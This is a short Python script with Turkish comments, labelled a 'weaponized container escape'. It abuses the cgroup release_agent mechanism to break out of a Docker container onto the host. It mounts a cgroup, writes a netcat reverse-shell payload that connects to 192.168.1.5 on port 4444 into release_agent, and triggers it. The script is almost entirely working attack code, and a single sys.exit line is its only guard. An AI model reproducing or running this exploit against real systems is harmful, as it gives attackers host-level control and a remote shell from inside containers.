import os
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod Docker konteynerinden Host sisteme kaçış yapar.")

print("--- WEAPONIZED CONTAINER ESCAPE ---")

def escape_docker():
    # 1. ORTAM HAZIRLIĞI (Weaponized Part)
    # Simülasyon: if os.path.exists(...): print("Açık Var")
    # Gerçek: Cgroup'u mount et ve exploit dosyasını yaz.
    
    print("[*] Cgroup RDMA mount ediliyor...")
    os.system("mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp")
    
    # 2. ZARARLI PAYLOAD
    # Host işletim sisteminde çalışacak komut (Reverse Shell)
    payload = "#!/bin/sh\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.5 4444 >/tmp/f"
    
    print("[*] 'release_agent' dosyasına payload yazılıyor...")
    
    # Konteyner içindeki yolu Host yoluyla eşleştir
    with open("/tmp/cgrp/release_agent", "w") as f:
        f.write(payload)
        
    # Dosyayı çalıştırılabilir yap
    os.system("chmod a+x /tmp/cgrp/release_agent")
    
    # 3. TETİKLEME (TRIGGER)
    # Cgroup içinde bir işlem bitince kernel 'release_agent' içindeki kodu çalıştırır.
    # Bu kod HOST yetkisiyle çalışır!
    print("[!] Exploit tetikleniyor...")
    os.system("sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'")
    
    print("💀 KAÇIŞ BAŞARILI. Host terminali bağlantısı bekleniyor.")

if __name__ == "__main__":
    escape_docker()